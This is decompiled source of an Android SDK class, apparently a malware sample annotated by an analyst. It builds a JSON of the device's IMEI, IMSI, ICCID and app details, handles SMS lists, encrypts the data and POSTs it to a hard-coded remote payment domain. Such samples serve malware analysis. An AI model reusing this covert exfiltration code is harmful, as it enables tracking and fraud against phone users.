package bn.sdk.szwcsss.common.az.c.net;

import android.util.Log;
import bn.sdk.szwcsss.common.az.c.model.Cint;
import bn.sdk.szwcsss.common.az.c.model.RespParam;
import bn.sdk.szwcsss.common.az.c.model.SmsInfo;
import bn.sdk.szwcsss.common.az.code.b.Cbyte;
import bn.sdk.szwcsss.common.az.code.b.Cif;
import bn.sdk.szwcsss.common.az.code.b.Cnew;
import bn.sdk.szwcsss.common.az.code.b.Ctry;
import bn.sdk.szwcsss.common.az.code.c.Cfor;
import com.yf.y.f.init.constant.Constant;
import java.lang.reflect.Field;
import java.lang.reflect.ParameterizedType;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
/* loaded from: classes.dex */

//[fmss] This abstract class implemnts the methods to collect data into a JSON file, encrypts them and send those informations
// with POST request to RE_DOMAIN
public abstract class AbstractReq implements bn.sdk.szwcsss.common.az.c.net.Cdo {
    private static final String[] CUSTOM_FIELD_TYPE = {"int", "Integer", "long", "Long", "String"};
    private static final String REQ_DOMAIN = "http://vpay.api.eerichina.com/api/payment";
    protected Cint reqParam;

    /* renamed from: bn.sdk.szwcsss.common.az.c.net.AbstractReq$do  reason: invalid class name */
    /* loaded from: classes.dex */
    public enum Cdo {
        JSON("application/json;charset=UTF-8");
        
        public String value;

        Cdo(String str) {
            this.value = str;
        }
    }

    public AbstractReq(Cint intVar) {
        this.reqParam = intVar;
    }

    private Object getCollFieldValue(Field field, Object obj) {
        return jsonToArray(getFieldGenericClass(field), (JSONArray) obj);
    }

    private String getEncryptContent() {
        return Cfor.a(paramToJSONObject().toString());
    }

    private Class getFieldGenericClass(Field field) {
        return "smsList".equals(field.getName()) ? SmsInfo.class : "comprise".equals(field.getName()) ? String.class : (Class) ((ParameterizedType) field.getGenericType()).getActualTypeArguments()[0];
    }

    private Object getFieldValue(Field field, Object obj) {
        return (!isEntityField(field) || !(obj instanceof JSONObject)) ? (!isCollField(field) || !(obj instanceof JSONArray)) ? obj : getCollFieldValue(field, obj) : jsonToBean(field.getType(), (JSONObject) obj);
    }

    private Cnew getHttpReq() {
        Cif ifVar = new Cif();
        ifVar.a(b());
        ifVar.d(REQ_DOMAIN + a());
        if (b() == Cif.Cdo.POST) {
            ifVar.e(getEncryptContent());
            ifVar.c(Cdo.JSON.value);
        }
        return ifVar;
    }

    private boolean isCollField(Field field) {
        return field.getType().isAssignableFrom(List.class);
    }

    private boolean isCustomField(Class cls) {
        return Arrays.asList(CUSTOM_FIELD_TYPE).contains(cls.getSimpleName());
    }

    private boolean isCustomField(Field field) {
        return isCustomField(field.getType());
    }

    private boolean isEntityField(Field field) {
        return !isCustomField(field) && !isCollField(field);
    }

    private Object jsonToArray(Class cls, JSONArray jSONArray) {
        int i = 0;
        ArrayList arrayList = new ArrayList();
        if (isCustomField(cls)) {
            while (i < jSONArray.length()) {
                arrayList.add(jSONArray.opt(i));
                i++;
            }
        } else {
            while (i < jSONArray.length()) {
                arrayList.add(jsonToBean(cls, jSONArray.optJSONObject(i)));
                i++;
            }
        }
        return arrayList;
    }

    private Object jsonToBean(Class cls, String str) {
        try {
            return jsonToBean(cls, new JSONObject(Cfor.b(str)));
        } catch (Exception e) {
            Log.e(bn.sdk.szwcsss.common.az.c.constant.Cdo.f525a, "", e);
            return null;
        }
    }

    private Object jsonToBean(Class cls, JSONObject jSONObject) {
        Field[] declaredFields;
        Object newInstance = cls.newInstance();
        for (Field field : cls.getDeclaredFields()) {
            field.setAccessible(true);
            Object opt = jSONObject.opt(field.getName());
            if (opt != null) {
                field.set(newInstance, getFieldValue(field, opt));
            }
        }
        return newInstance;
    }

    @Override // bn.sdk.szwcsss.common.az.c.net.Cdo
    public RespParam connToAccess() {
        try {
            Ctry a2 = Cbyte.a(getHttpReq());
            if (a2.i()) {
                return (RespParam) jsonToBean(RespParam.class, a2.g());
            }
        } catch (Exception e) {
            Log.e(bn.sdk.szwcsss.common.az.c.constant.Cdo.f525a, "请求失败", e);
        }
        return null;
    }

    @Override // bn.sdk.szwcsss.common.az.c.net.Cdo
    public JSONObject paramToJSONObject() {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("imei", this.reqParam.c());
            jSONObject.put("imsi", this.reqParam.b());
            jSONObject.put("iccid", this.reqParam.g());
            jSONObject.put("netType", this.reqParam.p());
            jSONObject.put(Constant.SP_KEY_APPCODE, this.reqParam.r());
            jSONObject.put(Constant.SP_KEY_PACKCODE, this.reqParam.s());
            jSONObject.put("sdkVersion", this.reqParam.j());
            jSONObject.put("packageName", this.reqParam.l());
        } catch (Exception e) {
            Log.e(bn.sdk.szwcsss.common.az.c.constant.Cdo.f525a, "", e);
        }
        return jSONObject;
    }
}
